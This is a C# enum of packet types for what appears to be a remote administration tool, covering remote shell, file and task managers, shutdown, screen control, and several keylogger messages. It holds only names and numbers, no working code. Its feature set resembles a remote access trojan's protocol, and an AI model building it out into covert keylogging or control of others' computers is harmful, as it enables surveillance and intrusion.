namespace Common.Enums
{
    public enum PacketType
    {
        Unknown = 0,
        Ping = 1,
        Pong = 2,
        SystemInfoRequest = 10,
        SystemInfoResponse = 11,

        RemoteShellRequest = 12,
        RemoteShellResponse = 13,

        FileManagerRequest = 14,
        FileManagerResponse = 15,

		    TaskManagerRequest = 20,
        TaskManagerResponse = 21,
        
        MessageBoxRequest = 16,
        MessageBoxResponse = 17,
        // KeyLogger packets
        KeyLoggerStart = 100,
        KeyLoggerStop = 101,
        KeyLoggerEvent = 102, // single key event (parallel)
        KeyLoggerBatch = 103, // batch text (continuous)
        KeyLoggerComboEvent = 104, // detected key combination event
        KeyLoggerLangToggle = 105,
        //Action packet
        ShutdownActionResponse = 18,
        ShutdownActionRequest = 19,
        
        //Screen Control packets
        ScreenControlStart = 200,
        ScreenControlStop = 201,
        ScreenControlFrame = 202,
        ScreenControlMouseEvent = 203,
        ScreenControlKeyboardEvent = 204,
        ScreenControlResponse = 205
    }
}


